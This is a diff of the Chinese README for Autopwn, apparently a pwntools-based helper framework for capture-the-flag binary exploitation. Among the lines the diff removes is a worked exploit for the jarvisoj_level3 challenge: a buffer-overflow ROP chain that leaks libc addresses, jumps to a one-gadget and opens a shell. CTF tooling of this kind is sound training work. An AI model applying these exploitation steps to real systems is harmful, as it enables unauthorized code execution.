@@ -1,5 +1,8 @@
 # Autopwn
 
+当前处于活跃开发的分支为全面迁移到python 3.8的dev分支，而即将被抛弃的master分支仅支持python2。
+由于兼容性的问题，本分支不再提供对连接ida的支持。
+
 ## 简介
 
 Autopwn项目，致力于提供如下特性：
@@ -12,34 +15,31 @@ Autopwn项目，致力于提供如下特性：
 - 使用命令行参数启动脚本，从而实现不同的功能（local run，local debug，remote run）
 - 允许用户自定义debug时的gdb脚本，添加了对PIE程序仅使用偏移下断点的支持
 - 允许用户自行提供函数封装，并将其添加为tubes的方法，已内置数个别名
-- 允许用户更改elf文件的库查找路径与解释器路径（使用patchelf实现）
+- 允许用户更改elf文件的库查找路径与解释器路径（使用patchelf以及lief实现）
 - 允许用户为当前的elf生成一个可修改的lief Binary对象
 - 添加Ubuntu常用库的数据库（ld，libc，libdl）
 
 ## 效果图
 
-- 自动生成配置文件
+- 生成配置文件
 ![](https://github.com/CTSinon/Autopwn/blob/master/screenshots/autoconf.gif)
 
-- 搭配emacs的YASnippet插件一键生成exp框架
+- 搭配emacs的YASnippet插件生成exp框架
 ![](https://github.com/CTSinon/Autopwn/blob/master/screenshots/genexp.gif)
 
-- 一键patchelf
+- patchelf
 ![](https://github.com/CTSinon/Autopwn/blob/master/screenshots/autopatch.gif)
 
-- 自带常用tube方法别名（如rl，sl，ru），一键运行（废话
+- 自带常用tube方法别名（如rl，sl，ru）
 ![](https://github.com/CTSinon/Autopwn/blob/master/screenshots/run.gif)
 
-- 无视PIE，自定义断点，一键调试
-![](https://github.com/CTSinon/Autopwn/blob/master/screenshots/breakpoint.gif)
-
-- 一键远程连接
+- 远程连接
 ![](https://github.com/CTSinon/Autopwn/blob/master/screenshots/remote.gif)
 
 ## 安装
 
 ### 依赖
-- python 2.7 (environment)
+- python 3.8.3 (environment)
 - pwntools (module)
 - pandas (module)
 - lief (module)
@@ -58,76 +58,11 @@ Autopwn项目，致力于提供如下特性：
 
 5. enjoy it!
 
-### 关于lief模块的安装
-
-lief官方已经在最新版的lief中抛弃了对python 2.7的支持，因此我们需要一个旧版本，在这里你可以下载到旧版本的egg包：
-
-https://github.com/lief-project/LIEF/releases/download/0.9.0/lief-0.9.0-py2.7-linux.egg
-
-然后使用easy_install来安装即可：
-
-`easy_install lief-0.9.0-py2.7-linux.egg`
-
 ## 其他
 
 ### 栗子🌰
 
-题目链接：https://buuoj.cn/challenges#jarvisoj_level3
-
-```python
-from pwn import *
-from autopwn.core import pwn
-from sys import argv
-
-def leak(self, a):
-    pass
-
-
-# 该函数将会被动态添加到内置的一个类中
-# 你可以自由的使用类属性（如当前elf对象）
-# 代价仅仅是在参数中添加一个self
-def exp(self, a):
-    read_got = self.elf.got['read']
-    # 这里elf对象是类属性
-    write_got = self.elf.got['write']
-    write_plt = self.elf.plt['write']
-    read_plt = self.elf.plt['read']
-    esp_c = 0x080482ee
-    read_offset = self.lib[0].symbols['read']
-    # lib同样是类属性，是一个存放下面指定的lib对应的elf对象的数组
-    one_offset = 0x3a80c
-
-    a.rl()
-    # 这是recvline的别名，你可以在less_tube.py中定义你自己的别名
-    payload = 'a' * 0x88
-    payload += 'a' * 4
-    payload += p32(write_plt) + p32(esp_c)
-    payload += p32(1) + p32(read_got) + p32(4)
-    payload += p32(read_plt) + p32(write_plt)
-    payload += p32(0) + p32(write_got) + p32(4)
-
-    a.sl(payload)
-
-    read_addr = unpack(a.recvn(4), 'all')
-    a.lg("Got read addr: ", read_addr)
-    one_addr = read_addr + one_offset - read_offset
-
-    a.send(p32(one_addr))
-    
-# 该函数用于getshell之后获取flag
-# 一般的题目这样就好
-def get_flag(self, a):
-    a.interactive()
-    return
-
-pwn.ctf(argv, exp, get_flag,
-        bp=0x080484a6,
-        # 指定断点，开启PIE时使用偏移就好
-        inter='../libc6-i386_2.23-0ubuntu10_amd64/ld-2.23.so',
-        # 如果你要patch libc的话，一定要指定相应的ld
-        needed=['../libc6-i386_2.23-0ubuntu10_amd64/libc-2.23.so'])
-        # needed是一个数组，你可以使用它来替换dynamic段中所用needed项（包括大部分动态链接库）
-```
+//TODO
 
 ### 目录结构
 
@@ -136,13 +71,14 @@ pwn.ctf(argv, exp, get_flag,
 ├── \
 ├── autopwn
 │   ├── awd                       # awd框架，未实现
-│   │   ├── attacker.py           # =-=
-│   │   ├── attack.py             # =-=
+│   │   ├── attacker.py           # //TODO
+│   │   ├── attack.py             # //TODO
 │   │   ├── get_ip.py             # 获取目标列表
 │   │   └── __init__.py
 │   ├── core
 │   │   ├── classes.py            # 存放核心类
 │   │   ├── __init__.py
+│   │   ├── tools.py              # 存放常用的工具函数与工具类
 │   │   └── pwn.py                # 主文件
 │   ├── ctf
 │   │   ├── attack.py             # 主文件
